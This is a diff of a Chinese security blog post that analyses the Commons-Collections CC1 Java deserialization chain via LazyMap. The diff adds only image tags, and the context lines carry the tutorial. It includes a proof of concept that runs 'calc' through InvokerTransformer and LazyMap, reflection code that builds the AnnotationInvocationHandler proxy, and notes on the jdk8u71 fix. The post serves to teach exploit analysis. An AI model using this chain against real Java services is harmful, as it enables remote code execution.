@@ -302,7 +302,7 @@
 <blockquote>
 <p>之前我们所讲的是 <code>TransformedMap</code> 的链子，今天我们去追正版 CC1 链里面 <code>LazyMap</code> 的链子。</p>
 </blockquote>
-
+<img src="/2022/06/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8702-CC1%E9%93%BE%E8%A1%A5%E5%85%85/LazyMapFind.png" class>
 
 <p>我们看到这里，是 <code>LazyMap</code> 这个类的 <code>get</code> 方法中出现了 <code>.transform</code> 方法。<code>get</code> 方法的作用域为 public。</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;  </span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map  </span></span><br><span class="line"> <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);  </span><br><span class="line"> map.put(key, value);  </span><br><span class="line"> <span class="keyword">return</span> value;  </span><br><span class="line"> &#125;  </span><br><span class="line">    <span class="keyword">return</span> map.get(key);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -311,7 +311,7 @@
 <h3 id="2-寻找链子"><a href="#2-寻找链子" class="headerlink" title="2. 寻找链子"></a>2. 寻找链子</h3><ul>
 <li>我们去找一找 <code>factory</code> 是什么</li>
 </ul>
-
+<img src="/2022/06/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8702-CC1%E9%93%BE%E8%A1%A5%E5%85%85/decorate.png" class>
 
 <p>在找 <code>factory</code> 的时候偶然发现了 <code>decorate</code> 方法，这个 <code>decorate</code> 方式与我们之前讲的 <code>TransformMap</code> 中的 <code>decorate</code> 方法是一样的作用。</p>
 <blockquote>
@@ -320,21 +320,21 @@
 <p>先看这个类的构造函数，作用域为 <code>private</code>，因为无法直接获取，而 <code>decorate</code> 方法里面能够 new 一个 <code>LazyMap</code> 对象，于是我们构造如下的 EXP，来证明这条链子暂时是可行的。</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoChainsEXP;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 用 decorate 触发弹计算器，确保此链可用  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazyDecorateCalc</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();  </span><br><span class="line"> <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>  </span><br><span class="line"> , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);  </span><br><span class="line"> HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line"> <span class="type">Map</span> <span class="variable">decorateMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, invokerTransformer);  </span><br><span class="line"> Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;  </span><br><span class="line"> <span class="type">Method</span> <span class="variable">lazyGetMethod</span> <span class="operator">=</span> lazyMapClass.getDeclaredMethod(<span class="string">&quot;get&quot;</span>, Object.class);  </span><br><span class="line"> lazyGetMethod.setAccessible(<span class="literal">true</span>);  </span><br><span class="line"> lazyGetMethod.invoke(decorateMap, runtime);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2022/06/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8702-CC1%E9%93%BE%E8%A1%A5%E5%85%85/LazyMapExp.png" class>
 
 <ul>
 <li>目前证明这条链是可行的，我们继续往上走，最终目标是找到入口类的 <code>readObject</code> 方法。</li>
 </ul>
 <p>往上走，我们去找一找谁调用了 <code>LazyMap.get()</code></p>
 <p>最终在 <code>AnnotationInvocationHandler.invoke()</code> 方法中找到了有一个地方调用了 <code>get()</code> 方法。</p>
-
+<img src="/2022/06/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8702-CC1%E9%93%BE%E8%A1%A5%E5%85%85/AnnotationInvocationHandler.png" class>
 
 <p>同时这个类也非常好，它里面有 <code>readObject()</code> 方法，可以作为我们的入口类。</p>
 <ul>
 <li>现在的关键点在于我们要触发 <code>AnnotationInvocationHandler.invoke()</code></li>
 </ul>
 <h2 id="0x03-编写-EXP"><a href="#0x03-编写-EXP" class="headerlink" title="0x03 编写 EXP"></a>0x03 编写 EXP</h2><p>需要触发 <code>invoke</code> 方法，马上想到动态代理，一个类被动态代理了之后，想要通过代理调用这个类的方法，就一定会调用 <code>invoke()</code> 方法。我们去找一找能利用的地方</p>
-
+<img src="/2022/06/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8702-CC1%E9%93%BE%E8%A1%A5%E5%85%85/ReadObjectMember.png" class>
 
 <p>在这里调用了 <code>entrySet()</code> 方法，也就是说，如果我们将 <code>memberValues</code> 的值改为代理对象，当调用代理对象的方法，那么就会跳到执行 <code>invoke()</code> 方法，最终完成整条链子的调用。</p>
 <p>直接上我们的 EXP</p>
@@ -343,7 +343,7 @@
 <ul>
 <li>成功！</li>
 </ul>
-
+<img src="/2022/06/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8702-CC1%E9%93%BE%E8%A1%A5%E5%85%85/FinalCalc.png" class>
 
 <p>我们被代理的实例是这一个</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">a</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">aDeclaredConstructor</span> <span class="operator">=</span> a.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">aDeclaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) aDeclaredConstructor.newInstance(Override.class, decorateLazyMap);</span><br></pre></td></tr></table></figure>
@@ -354,16 +354,16 @@
 
 <h2 id="0x04-修复手段"><a href="#0x04-修复手段" class="headerlink" title="0x04 修复手段"></a>0x04 修复手段</h2><p>官方这里的推荐修复方法是将 jdk 版本提升至 jdk8u71，我们来看一下为什么官方会推荐这种方法。</p>
 <h3 id="1-对于-TransformerMap-版的-CC1-链子"><a href="#1-对于-TransformerMap-版的-CC1-链子" class="headerlink" title="1. 对于 TransformerMap 版的 CC1 链子"></a>1. 对于 TransformerMap 版的 CC1 链子</h3><p>对于 TransformerMap 版的 CC1 链子来说，jdk8u71 及以后的版本没有了能调用 ReadObject 中 <code>setValue()</code> 方法的地方。</p>
-
+<img src="/2022/06/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8702-CC1%E9%93%BE%E8%A1%A5%E5%85%85/jdk8u71.png" class>
 
 <h3 id="2-对于正版-CC1-链子"><a href="#2-对于正版-CC1-链子" class="headerlink" title="2. 对于正版 CC1 链子"></a>2. 对于正版 CC1 链子</h3><p>因为在8u71之后的版本反序列化不再通过<code>defaultReadObject</code>方式，而是通过<code>readFields</code> 来获取几个特定的属性，<code>defaultReadObject</code> 可以恢复对象本身的类属性，比如<code>this.memberValues</code> 就能恢复成我们原本设置的恶意类，但通过<code>readFields</code>方式，<code>this.memberValues</code> 就为null，所以后续执行get()就必然没发触发，这也就是高版本不能使用的原因</p>
-
+<img src="/2022/06/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8702-CC1%E9%93%BE%E8%A1%A5%E5%85%85/Suite.png" class>
 <h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><blockquote>
 <p>小结部分主要来整理一下链子和我们的攻击思路。</p>
 </blockquote>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">调用链 </span><br><span class="line">	InvokeTransformer#transform</span><br><span class="line">		LazyMap#get</span><br><span class="line">			AnnotationInvocationHandler#readObject</span><br><span class="line">			</span><br><span class="line"></span><br><span class="line">辅助链</span><br><span class="line">ChainedTransformer</span><br><span class="line">ConstantTransformer</span><br><span class="line">HashMap</span><br><span class="line"><span class="title function_">Map</span><span class="params">(Proxy)</span>#entrySet</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2022/06/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8702-CC1%E9%93%BE%E8%A1%A5%E5%85%85/CC1LazyMap.png" class>
             </div>
 
             
